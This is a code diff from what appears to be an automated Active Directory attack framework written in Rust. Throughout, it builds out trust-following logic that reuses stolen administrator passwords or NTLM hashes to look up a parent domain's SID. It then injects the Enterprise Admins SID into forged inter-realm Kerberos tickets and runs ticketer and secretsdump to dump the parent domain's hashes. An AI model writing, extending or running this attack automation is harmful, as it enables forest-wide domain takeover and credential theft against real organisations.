@@ -1481,6 +1481,89 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 continue;
             }
 
+            // For child→parent forges we MUST inject the parent's Enterprise
+            // Admins SID (RID 519) as ExtraSid; without it the parent KDC
+            // issues a TGS but DRSUAPI on the parent DC rejects the
+            // replication call as `rpc_s_access_denied` and nxc dumps zero
+            // hashes (exit 0, hiding the failure). Resolve the parent SID
+            // on-demand via lookupsid against the parent DC using source
+            // admin creds (cross-trust SAMR works) when it isn't cached.
+            // Defer dispatch (no dedup mark) when resolution fails so the
+            // next 30s tick can retry once enumeration progresses.
+            let source_l = item.source_domain.to_lowercase();
+            let target_l = item.target_domain.to_lowercase();
+            let is_child_to_parent =
+                source_l != target_l && source_l.ends_with(&format!(".{target_l}"));
+            let target_domain_sid: Option<String> =
+                if !is_child_to_parent || item.target_domain_sid.is_some() {
+                    item.target_domain_sid.clone()
+                } else {
+                    let (src_cred, src_hash) = {
+                        let s = dispatcher.state.read().await;
+                        let src_lower = item.source_domain.to_lowercase();
+                        let cred = s
+                            .credentials
+                            .iter()
+                            .find(|c| {
+                                c.is_admin
+                                    && !c.password.is_empty()
+                                    && c.domain.to_lowercase() == src_lower
+                            })
+                            .cloned();
+                        let h = s
+                            .hashes
+                            .iter()
+                            .find(|h| {
+                                h.username.to_lowercase() == "administrator"
+                                    && h.domain.to_lowercase() == src_lower
+                                    && h.hash_type.to_uppercase() == "NTLM"
+                            })
+                            .cloned();
+                        (cred, h)
+                    };
+                    let resolved = super::golden_ticket::resolve_domain_sid(
+                        &item.target_domain,
+                        &target_dc_ip,
+                        src_cred.as_ref(),
+                        src_hash.as_ref(),
+                    )
+                    .await;
+                    if let Some((sid, admin_name)) = resolved {
+                        info!(
+                            target_domain = %item.target_domain,
+                            sid = %sid,
+                            "Resolved parent domain SID for child→parent forge ExtraSid"
+                        );
+                        let op_id = { dispatcher.state.read().await.operation_id.clone() };
+                        let reader = ares_core::state::RedisStateReader::new(op_id);
+                        let mut conn = dispatcher.queue.connection();
+                        let tgt_lower = item.target_domain.to_lowercase();
+                        let _ = reader.set_domain_sid(&mut conn, &tgt_lower, &sid).await;
+                        if let Some(ref name) = admin_name {
+                            let _ = reader.set_admin_name(&mut conn, &tgt_lower, name).await;
+                        }
+                        {
+                            let mut state = dispatcher.state.write().await;
+                            state.domain_sids.insert(tgt_lower.clone(), sid.clone());
+                            if let Some(ref name) = admin_name {
+                                state.admin_names.insert(tgt_lower, name.clone());
+                            }
+                        }
+                        Some(sid)
+                    } else {
+                        warn!(
+                            source = %item.source_domain,
+                            target = %item.target_domain,
+                            target_dc_ip = %target_dc_ip,
+                            "Could not resolve parent SID — deferring child→parent forge"
+                        );
+                        None
+                    }
+                };
+            if is_child_to_parent && target_domain_sid.is_none() {
+                continue;
+            }
+
             // Build args for the combined `forge_inter_realm_and_dump` tool.
             // This single tool runs impacket-ticketer + impacket-secretsdump
             // sequentially in one worker invocation (shared tempdir as cwd),
@@ -1501,7 +1584,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             if let Some(ref sid) = source_domain_sid {
                 tool_args["source_sid"] = json!(sid);
             }
-            if let Some(ref sid) = item.target_domain_sid {
+            if let Some(ref sid) = target_domain_sid {
                 tool_args["target_sid"] = json!(sid);
             }
             // AES256 trust key — required for Win2016+ target DCs which
@@ -1510,18 +1593,12 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 tool_args["aes_key"] = json!(aes);
             }
             // For child→parent trusts (intra-forest), inject parent's
-            // Enterprise Admins SID (RID 519) into the forged ticket so
-            // DRSUAPI accepts the request at the parent DC. Without this,
-            // the parent rejects the forged Administrator with access
-            // denied because the ticket only carries child SIDs.
-            // SID filtering blocks ExtraSID injection across forest trusts,
-            // so only emit it when source is a sub-domain of target.
-            let source_l = item.source_domain.to_lowercase();
-            let target_l = item.target_domain.to_lowercase();
-            let is_child_to_parent =
-                source_l != target_l && source_l.ends_with(&format!(".{target_l}"));
+            // Enterprise Admins SID (RID 519). SID filtering blocks
+            // ExtraSID across forest trusts, so only emit on intra-forest.
+            // The defer above guarantees target_domain_sid is Some here
+            // when is_child_to_parent.
             if is_child_to_parent {
-                if let Some(ref tsid) = item.target_domain_sid {
+                if let Some(ref tsid) = target_domain_sid {
                     tool_args["extra_sid"] = json!(format!("{tsid}-519"));
                 }
             }
